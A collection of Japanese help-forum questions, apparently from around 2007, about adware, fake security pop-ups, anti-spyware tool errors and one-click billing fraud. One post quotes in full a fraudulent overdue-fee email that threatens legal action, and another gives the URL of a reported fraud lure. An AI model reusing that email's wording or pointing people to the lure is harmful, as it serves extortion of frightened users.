あのすみません。先日、兄がアダルトサイトに入会してしまい、その結果、背景に張り付いてしまいます。しかも、インターネットなどをやっていると、５分刻みで画面に出てきてしまいます。一応それを端っこの方には移動できるのですが、画面に出てきてしまいます。背景を変えてもきえません。こういう場合はどうすればいいのでしょうか？もう本当に困っています。起動するたびに見てしまいます。OSを再起動とかは俺の親が怒るのでダメなので、出来れば簡単で影響力の少ない消し方を教えてください（＞＿＜；）
ワンクリック詐欺でしょうか？ 興味本意でクリックしてしまったら こんなメールが届きました。 　　　≪番組料金滞納通知≫ 　　　　　　　　　　○○ＡＶ事務局 　　　　　　　　会員ID番号　○○様へ お客様は2007-10-○日　○時○分にご入会頂けました当サイト、フレッシュＡＶのご入会時に発生しております番組料金99200円を滞納なさっております。 早急に番組料金99200円のお支払いをお願い申し上げます。 【お支払い口座及びにカード決済案内ページ】 http://www1.********.*** ※必ずご確認の上、お間違えないようお願い申し上げます。 お客様は、利用規約確認画面、その先の最終ご利用確認画面のOKボタンを押されご入会処理を行って頂いております。つまりは利用規約に同意してご入会して頂けております。 利用規約において、料金のお支払いは入会日2007-10-○日○時○分より３日以内とさせて頂いておりますが、お客様は既にご入会日より4日が経過しております。 これは、利用規約違反に該当致します。早急にお支払い頂けなければ、利用規約13条、16条に基づき、少額訴訟などの法的手続き及びに遅延損害金、通常料金のご請求をさせて頂く場合も御座いますので、早急なご対応をお願い申し上げます。 また、ご対応して頂けない場合は、当方と致しましては悪意を持ったご入会者及びに悪質な利用者として判断せざるを得ませんので、所定の手続きも取らせて頂きますので、併せてご了承ください。 本メールに対して、ご質問等は必ず下記窓口までお問い合わせください。 【お客様サポート窓口】 フリーダイヤル　　0120-***-*** メール問合わせ　　support@*****.*** ※お問合わせ時は必ず、ID番号のご提示をお願いします。 【お支払い口座及びにカード決済案内ページ】 http://wwwーーーーーーー ※必ずご確認の上、お間違えないようお願い申し上げます。 ＜＜番組入場口＞＞ http://www. ◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇ 会員ID　○○様のご入会情報 ◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇ １、会員ID番号　　FAV○○○○ ２、ご入会日　　2007/○○/○○ ３、IPアドレス　　○○○.○○○.○○○ ４、プロバイダー　 クリックだけでメルアド分かるシステムなのですか？ ワンクリックでどこまでの個人情報（電話番号、住所）が分かって 本当に請求されるのか教えてくださいｍ（__）ｍ 会社のＰＣでやってしまったので怖くて… 自分で巻いた種なのですが、是非どなたか 助けてください。 宜しくお願い致します。
お勧めのｓｐｙｗａｒｅが有りましたら教えてください 経験談などもお願いします 失礼かもしれませんがこれは勧められない物の教えてください
OSに小さな不具合がいくつかできたので　久しぶりにクリーンインストールをしました スパイウエア対策ソフトもいれました　Spybot-S&D1.4も入れましたが前はなかったメッセージが出てきます WindowsUPdateやソフトのインストール時に　「重要なレジストリの変更を検知・・」のメッセージが出てきて止まります　許可を押さえると動き出しますが　今回のような場合　回数がとても多くうっとうしいので出なくしたいのです　どうすればいいのでしょうか　Spybotの設定のなかにあるのでしょうか　探しているのですが見つかりません OS WinXP Home SP2です
カスペルスキーインターネットセキュリティ　７．０を使用しています。 レポートとデータファイル→レポート→検知に、以下のことが記入されています。 検知しました: リスクウェア Hidden data sendingプロセスを実行します: C:\WINDOWS\system32\dwwin.exe 欄外最上部には「現在　脅威はありません」とあります。 そもそも、Hidden data sendingとは何者なのでしょうか。 どうにも目障りです。 削除してもいいものでしょうか。 ご指導よろしくお願いいたします。
インターネットをやっていると勝手にウインドウが開くスパイウェアが入り込みました そこでスパイボットS＆DをDLし言われるがままサーチをすると54件ほどひっかかったのですべて消しました するとウインドウは出てこなくなったのですが、 その2日後くらいからパソコンの動きがすさまじく遅くなり(残り30分と表示されている作業が3時間たっても終わらないほど) 「エラー」という題名で白くボタンのみがある小さなウインドウがたびたび出るようになり、 何か作業をしていても「問題が発生したため○○を終了しました」といって強制終了させられることがよくあるようになってしまいました これはスパイボットが原因なのかと思い、スパイボットをDLする前の状態に復元してみましたところ、上記の問題はなくなりましたがスパイウェアまで復活してしまいました・・・ どうすればスパイウェアも消え、上記の問題も起こらないようになるでしょうか。 どうか何卒お力添えをよろしくおねがいします・・・
最近、パソコンを使っていると、「Doraibuhogoは削除しなければならない危険な痕跡を見つけることができます。 あなたのプライバシーかご芳名は脅威されるを許さないでください。 ご個人情報を公にすれば、ご部長、ご家族関係、ご友達関係の問題が起こる場合が あります。プライバシーを守るために「OK]をクリックして、Doraibuhogoのスキャン機能は疑惑を 招くような痕跡、危うくするような情報を削除して、保護コントロールを設定します。」 というポップアップが出てます。 これが怪しいものであることはわかっているのですが、このポップアップを出ないようにするにはどうしたらよいのでしょうか？ パソコンを使っている間、何度も出てしまい困っています。 よろしくお願いします。
Ad-Aware2007をアップデートしようとすると以下のエラーが出てしまいます。 Event SSL DOWNLOAD FAILED Suggested Action Run Webupdate Ad-AwareSEの時は問題なくアップデート出来ていました。 パソコンの構成は以下の通りです。 PC：DELL　Oetiplex GX60 CPU：Intel　Celeron(R）　2.66GHz OS：WindowsXP HomeEdition SP2 インターネット環境：ISDN社内ネットワーク セキュリティーソフト：ウイルスバスター2007 その他：SpywareBlaster　 宜しくお願いします。
ｊａｖａマークのついたウィンドウが消しても消してもたちあがります・・・。 内容は全部英語です。 one or more necessay files appear to be invalid. のような文でまだ続きます。 調べてもいまいち訳が理解できません。 ウィルスソフトを使いましたが検出されませんでした。 プログラム自体が書き換えられている可能性があるのでウィルスとして反応しないとも聞きました・・。 パソコンの詳しい方助けてください＞＜！！
よろしくお願いします！！ 質問１ ＭＳサイトからSpyware Doctorを導入しています。 このソフトで、コンピューターウィルスをある程度防ぐことができるのでしょうか。 Spywareはどちらかというと、”フィシュング”的なウイルスを対象にしたソフトで、いわゆるコンピューターウイルスを防御するのにはあまり効果はないのでしょうか。 質問２ Googleに”avast Antivirus"というのが提供されていると思いますが、これとさきのSpy ware Doctorを並行して導入してもいみはあるのでしょうか。 以上の点につきましてアドバイスください。
８年前に発売された古いパソコンをインターネットに接続して使いたいと思っているのですが、セキュリティソフトを入れてもそれほど重くならず、快適・安全に使うことは可能でしょうか？ スペックは、 CPU: Celeron366MHz RAM: 320MB HDD: 40GB です。 OSはWindow98SEなのですが、Win98SEでは安全に使えない（適当なセキュリティソフトがない、セキュリティソフトを使ってもOSに危険性がある）ということであれば、WindowsXPを入れようかと思っています。(WindowsXPは、ProfessionalのほうがHomeよりも安全でしょうか？) セキュリティソフトはお店などで見ても、たくさんあって、どれにしたらよいのか、よくわかりません。 Kasperskyが最も安全と聞いたことがありますが、たとえばノートンもなど、他のセキュリティソフトを使っていて、何か被害にあうということはあるのでしょうか？もしそういう方がいらっしゃったら、何のソフトを使っておられたか教えて欲しいのですが・・・。 セキュリティソフトでお勧めのもの、反対にこれはやめた方がいいというものがあれば（それぞれいくつでも構いません）、教えていただければありがたいです。 よろしくお願いいたします。
先ほど、ワンクリック詐欺のようなサイトに引っかかってしまいました。 普通のブログ系のサイトだったので、安心していたのですが その中にあるリンクをクリックしたら、 ＭＳ－ＤＯＳのような画面が現れ…『登録しています…』 のようなメッセージが出て、あわててウィンドウを閉じました。 その後、ノートンでウィルスチェックしましたが何も検出されません。 ブログ系のサイトというのは↓のサイトです http://sutten1006.269g.net/article/5558697.html 上から７行目くらいにある 動画を再生させる⇒【フジテレビ追随原因動画】 をクリックすると ＭＳ－ＤＯＳのような画面が現れ…『登録しています…』 となりました。 これはワンクリック詐欺でしょうか？ どう対応したらよいのでしょうか？ 無知で申し訳ないですが、詳しいからいらっしゃいましたら 教えてください。よろしくお願いいたします。
PCにあまり強くない者です。教えてください。 数日前家の者がよくわからないままクリックしてしまったようでタスクバーの所に「盾」のようなマークが「？」「×」を繰り返し点滅させています。 ５分おきに「system alert」と出てクリックするとhttp://www.anti****.com/?aff=1012というサイトに飛びます。セキュリティソフトの宣伝HPのようですが、 これはウィルスなんでしょうか？削除の方法はありますでしょうか？ 使用環境はVAIO PCV-RZ53 Windows XPです。 セキュリティはNorton Internet Security 2006の２年版を使用しています。 よろしくお願いします。
　某有名ウィルスサイトに当方の手違いでアクセスし 　　ウィルススキャン→マルウエア＆ウイルス検出で、駆除しましたが 　　既に主要なシステムファイルを破壊されたため 　　HDDをフルフォーマットしました 　　が 　　　マルウエアは跡形もなく消えたのですが某有名ウィルスサイト 　　からスパイウエア等を再DLされないか心配です。（IPが割れた為） 　　　　　　再DLされるのかその辺どうなのか詳しく教えてもらえると 　　　ありがたいです。
パソコンからレコーダー(rd-xs43)を操作して番組を予約しようとすると cookies　→　@@@@@@ad.doubleclick.net/ インターネットアドレス(cookies: ユーザー名@レコーダーのIPアドレス/@@@@@@ad.doubleclick.net/) がTemporary Internet Filesに保存され、勝手に情報を送っているようなので(スパイウェアとして検出されます)、 doubleclick.netがつくアドレスへのアクセスを 完全にブロックする方法があれば、教えていただけないでしょうか？ 使用OS　windows xp ウイルスソフト　ノートン (ファイアウォールに登録しようとすると、指定したアドレスは有効ではありませんと言われて、追加できませんでした。) hostsファイルへの登録(効果なし) IEのプライバシー設定への登録 (レコーダーのIPアドレスをブロックすれば、cookiesは保存されなくなりますが、どうしてもdoubleclick.netにアクセスしている拡張子のないファイルがTemporary Internet Filesに保存されてしまいます。) 初めて質問しますので、文章がまとまらなくてすみません。 宜しくお願いします。
ワインを購入のため、HPでベルーナの通販の「My Wine Club」を開こうとしたら、英語のBelluna.netというHPにつながり、My Wine Clubにつながりませんでした。Spybotでスキャンしたところ「CasaleMedeia」というものが見つかり、削除したのですが削除したあとHPを開こうとすると同じ結果で、また「CasaleMedeia」が発見されます。セーフモードで削除しても同じ結果となります。 「CasaleMedeia」とは何でしょうか、また、どうしたらよいのでしょうか？
Spybodを利用してますが、前回アップグレード して以降、スキャンを開始しても速攻で終了に なります。どうやらスキャン範囲が全領域では なくなり、ほんの一部しかスキャンしてません。 こちらで設定をいじった記憶もないのですが、 どうすればいいのでしょうか？
SpyBotでスキャンしてCnsMin(21エントリ)とMyWebSearch(22エントリ)いうのが検出されたので、まずはCnsMinの方を削除しようとしました。そしたら砂時計のまま固まったので、一度終了させました(強制終了になりました)。もう一度SpyBotを起動させ、今度はMyWebSearchの方を削除しようとしたら、レジストリ？を変更するみたいなちょっとわからないものが出てきたので変更しないを選んだら、右下に「何とかが拒否された」みたいな文が出てきて、わけがわからなくなってしまい、一度PCを再起動させました。再起動するとデスクトップに、 「　RUNDLL C:\WINDOWS\DOWNLO~1\CnsMin.dllを読み込み中にエラーが発生しました。 指定されたモジュールがみつかりません。」 と、警告みたいなのが出てきました。何度再起動しても、システムを復元させても出てきます。ちょっと怖くなってしまったので、わかりずらい説明ですが、対処法がわかる方教えてくださいm(_ _)m
今日気がつきました。 画面右下のタスクに！マークのアイコンが出現し、クリックすると Spyware detection alert Your system migh be infected（あなたのシステムは感染したかもしれません） と窓が開きます。この窓、右クリックしても反応がありません。 このような警告はwindowsにある機能なのでしょうか？ 状態は↓をご覧ください。 http://wwwuploda.org/uporg1051640.gif またセーフモードにして常駐させていたウイルスソフトkingsoftで検索後ウイルスを2,3個駆除し、スパイウエアに関しては感染0となります。それで再起動しましたが状態変わりません。昨日の復元ポイントに戻しても同じでした。 他には今のところ変わったことはありません。 この窓は何なのか、本当に感染しているか、 なにかアドバイスありましたらよろしくお願いいたします。 winXP IE6.0 king soft anti virs anti spyware
はじめまして。 さっそくですが、 インターネットの検索バーや入力フォームで文字を入力すると 全角入力ができず、その後エラー報告のウィンドウが出てきて 開いているインターネットエクスプローラーのウィンドウが 全て消えてしまうようになりました。 最近では、文字入力をしなくても上記のようなエラー報告が出てきたり 画面が固まってしまったりするようになっています。 二つのエラーの原因が同じなのか、 何かのウィルスに感染しているのか、 対策方法などを教えていただけますでしょうか。 ちなみに、家族がアダルトサイトを閲覧しており、 以前、アダルトサイトのポップアップなどが出るようになったことがあります。 そのときは自分で何とか対処し、現在はウイルス対策ソフト「ウィルスセキュリティゼロ」というものを入れています。 できれば専門用語をあまり使わず教えていただければ幸いです。 宜しくお願いいたします。
初めてSpybot-Search＆Destroyというソフトでスキャンしてみたんですが、 問題個所にこれらのスパイウェア？が検出されました。 CnsMin　21エントリ FunWeb　16エントリ FunWebProducts　46エントリ LinkSynergy　1エントリ Microsoft.WindowsSecurityCenter.AntiVirusDisableNotify　1エントリ Microsoft.WindowsSecurityCenter.FirewallDisableNotify　1エントリ MyWay.MyWebSearch　68エントリ MyWebSearch　22エントリ Zango.AntiSpamBar　1エントリ これはすべてスパイウェアなのでしょうか？又、すべて削除してもいいものなのでしょうか？ わかる方、対策法を教えてくださいm(__)m
パソコン起動時にはGoogleを設定していますが、 先ほどから急に以下のサイトが現れるようになりました。 インターネットオプションで、ホームページをグーグルに設定しようとしてもダメです。 ホームのボタンをクリックするとマイクロソフトの警告表示が出ます。 シマンテックのサイトで、ウィルスとセキュリティーのサーチをしましたが感染はありません。 変なツールバーや、右下にアイコンが出来たりしています。 http://*****.com/?aid=246 一体これは何でしょうか？ 元に戻すことは出来ますか？ アドバイスあればよろしくお願いします。
Ad-Awareでsmart scanを行ったところ、 Tracking cookieが360個近く見つかってしまいました。 直前にSpybotで殆どのスパイウェアを駆除していたので驚きました。 ちなみにこのPCを使って2年近く経ちますが、Ad-Awareを使ったのは初めてです。 これらは全部駆除してしまって問題はないのでしょうか？ 2.3個なら普通に駆除しているところですが、ここまで多いと心配です。調べようにも多すぎて途方に暮れてしまいます。 普通のcookieが混ざっていて、それも削除してしまうという事はないのでしょうか？ どうかご回答宜しくお願いします。
SpybotをインストールしたらショートカットからExplorerを立ち上げられなくなりました。アンインストールすればまた立ち上げられるようになるのですが、できればSpybotを使いたいので、直し方がお分かりになる方、教えてください！
メールのリンクからの飛ばなければフィッシングにかかることは ないのですか？ 私はいつも検索で目的サイトにいっているのですが、 大丈夫ですか？
